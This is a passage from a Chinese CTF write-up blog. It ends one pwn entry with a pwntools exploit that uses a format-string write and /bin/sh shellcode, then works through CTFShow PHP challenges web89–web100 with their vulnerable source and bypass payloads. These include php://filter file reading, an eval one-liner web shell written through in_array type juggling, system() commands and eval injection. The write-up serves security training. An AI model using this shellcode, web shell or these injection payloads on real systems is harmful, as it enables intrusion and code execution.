<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_239oeQ1_yV.png"></p>
<p>使用Pwngdb在<code>printf(&amp;format, &amp;format)</code> 处设置断点，输入<code>0x052345</code>，在栈顶的第二个8字节，根据64位程序的传参方式，该地址是格式化字符串的第 7 个参数，<code>printf()</code> 函数的第 8 个参数。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_svTqth0fmx.png"></p>
<p>由此可以得到EXP</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(arch = &#x27;amd64&#x27;)</span></span><br><span class="line"><span class="comment"># context(log_level = &#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment"># context(terminal = [&#x27;deepin-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process(&#x27;./string&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">b&#x27;111.200.241.244&#x27;</span>, <span class="number">58455</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;secret[0] is &#x27;</span>)</span><br><span class="line">v3_addr = sh.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">v3_addr = <span class="built_in">int</span>(<span class="string">b&#x27;0x&#x27;</span> + v3_addr, <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(v3_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;name be:\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;east or up?:\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;east&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;leave(0)?:\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;\&#x27;Give me an address\&#x27;&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(v3_addr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;you wish is:\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;%85c%7$hhn&#x27;</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;I will help you! USE YOU SPELL&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">payload = <span class="string">b&#x27;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#x27;</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_sV8DjeRxJ4.png"></p>
]]></content>
      <categories>
        <category>PWN</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFShow-PHP特性</title>
    <url>/WP/CTFShow-PHP%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>新姿势，记录记录。</p>
<span id="more"></span>


<h1 id="WEB89"><a href="#WEB89" class="headerlink" title="WEB89"></a>WEB89</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>由于<code>intval(array(&#39;&#39;))==1</code>，故直接数组绕过</p>
<p>Payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?num[]=<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>说明</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">函数：<span class="keyword">int</span> <span class="title function_ invoke__">intval</span> ( <span class="keyword">mixed</span> <span class="variable">$var</span> [, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span> ] )</span><br><span class="line">说明：base=<span class="number">0</span>时，</span><br><span class="line">通过检测 <span class="keyword">var</span> 的格式来决定使用的进制：</span><br><span class="line">如果字符串包括了 <span class="string">&quot;0x&quot;</span> (或 <span class="string">&quot;0X&quot;</span>) 的前缀，使用 <span class="number">16</span> 进制 (hex)；</span><br><span class="line">如果字符串以 <span class="string">&quot;0&quot;</span> 开始，使用 <span class="number">8</span> 进制(octal)；</span><br><span class="line">否则，将使用 <span class="number">10</span> 进制 (decimal)。</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>Payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?num= <span class="number">4476</span> <span class="comment"># 空格</span></span><br><span class="line">?num=<span class="number">0x117c</span> <span class="comment"># 十六进制</span></span><br><span class="line">?num=<span class="number">010574</span> <span class="comment"># 八进制</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><code>/i</code>匹配大小写，<code>/m</code>匹配多行数据。<code>/^php$/m</code>这种形式能用<code>%0a</code>绕过。</p>
<p>Payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?cmd=%<span class="number">0</span>aphp</span><br><span class="line"></span><br><span class="line"><span class="comment">#还有一种方式，但是不太理解</span></span><br><span class="line">?cmd=php%<span class="number">0</span>a%<span class="number">0</span>a</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>Payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?num=<span class="number">0x117c</span></span><br><span class="line">?num=<span class="number">010574</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>还是一样的Payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?num=<span class="number">010574</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><strong>说明</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">函数：<span class="title function_ invoke__">strpos</span>(<span class="keyword">string</span>, find [,start])</span><br><span class="line">说明：</span><br><span class="line"><span class="keyword">string</span>是规定被搜索的字符串；find是规定要查找的字符；start是规定开始搜索的位置。</span><br><span class="line">返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 <span class="literal">FALSE</span>。</span><br><span class="line">注释：字符串位置从 <span class="number">0</span> 开始，不是从 <span class="number">1</span> 开始。</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><strong>payload</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?num= <span class="number">010574</span></span><br><span class="line">?num=<span class="number">4476.0</span>    <span class="comment">#由于intval()只识别整数部分</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;<span class="comment">//表明要存在0且不在首位</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>用<code>8进制</code>表示法绕过4476数字。</p>
<p><strong>payload</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?num= <span class="number">010574</span></span><br></pre></td></tr></table></figure>


<h1 id="web96-路径问题"><a href="#web96-路径问题" class="headerlink" title="web96(路径问题)"></a>web96(路径问题)</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><strong>payload</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php #利用LFI来查看源码</span></span><br><span class="line">/<span class="keyword">var</span>/www/html/flag.php              绝对路径</span><br><span class="line">./flag.php                          相对路径</span><br><span class="line">php:<span class="comment">//filter/resource=flag.php      php伪协议 </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>利用<code>数组</code>进行绕过即可得到flag</p>
<p>Payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a[]=<span class="number">1</span>&amp;b[]=<span class="number">2</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="comment">#若存在GET传值，用POST的值覆盖</span></span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="comment">#flag参数等于flag，就用$_COOKIE进行覆盖。这里让flag参数不等于flag值就好了</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="comment">#存在HTTP_FLAG参数等于flag，就出最终的flag答案</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>三元运算符在c语言里学过，不难理解<strong>三元运算符语法：条件 ? 结果1 : 结果2</strong>说明：问号前面的位置是判断的条件，如果满足条件时执行结果1，不满足时执行结果2。</p>
<p>这句代码可以展开</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>一旦用get方法传入参数，就会把get方法改为post方法，这里达到了修改get方法地址的目的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>)&#123;</span><br><span class="line"><span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>;<span class="comment">//只要有输入的get参数就将get方法改变为post方法(修改了get方法的地</span></span><br><span class="line">址)</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="string">&quot;flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>中间两行代码不需要考虑，因为不提交 flag 参数，只要在用get方法传入参数的基础上再post传 <strong>HTTP_FLAG&#x3D;flag</strong>，即可得到flag。</p>
<p><strong>payload</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//c8c910aa-6434-42db-9dde-1db5025cffba.chall.ctf.show/?1</span></span><br><span class="line">然后POST数据：HTTP_FLAG=flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web99（in-array弱类型比较）"><a href="#web99（in-array弱类型比较）" class="headerlink" title="web99（in_array弱类型比较）"></a>web99（in_array弱类型比较）</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>这题突破点在in_array()函数</p>
<p><strong>in_array()</strong><br>in_array：(PHP 4, PHP 5, PHP 7)</p>
<p>功能：检查数组中是否存在某个值</p>
<p>定义：<code> bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</code></p>
<p>在 $haystack中搜索 $needle，<code>如果第三个参数 $strict的值为 TRUE，则 in_array()函数会进行强检查，</code>检查 $needle的类型是否和 $haystack中的相同。如果找到 $haystack，则返回 TRUE，否则返回 FALSE。</p>
<p>很明显，这题再使用in_array()函数时并没有设置第三个参数为TRUE,所以此时是&#x3D;&#x3D;的弱类型比较。</p>
<p>**绕过方法:**传入n&#x3D;1.php。因为PHP在使用 in_array()函数判断时，会将 1.php强制转换成数字1，而数字1在 range(1,24)数组中，当随机生成的数字正好是1时绕过 in_array()函数判断，导致任意文件上传漏洞。</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?n=<span class="number">1</span>.php   </span><br><span class="line">post:   content=<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span>  <span class="comment">#写入一句话</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>多试几次，直到不报错的那一次，说明成功传入一句话。</p>
<p>然后访问<code>https://url/1.php</code>,再post传入<code>1=system(&#39;ls&#39;);</code></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage.png"></p>
<p>再访问这个flag36d.php,即post: 1&#x3D;<code>system(&#39;cat flag36d.php&#39;);</code></p>
<p>然后在网页源码中看到flag</p>
<h1 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title class_">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>很明显要get传入三个参数，并且保证<code>is_numeric($v1) and is_numeric($v2) and is_numeric($v3)</code>的结果是True，才能继续执行，也就是v1和v2和v3中至少有一个是数字就行。</p>
<p>第二部分:<br>因为源码中给了提示 ：flag in class ctfshow;，所以输出一个新的”ctfshow”类，构造:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="keyword">echo</span> <span class="keyword">new</span> ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure>


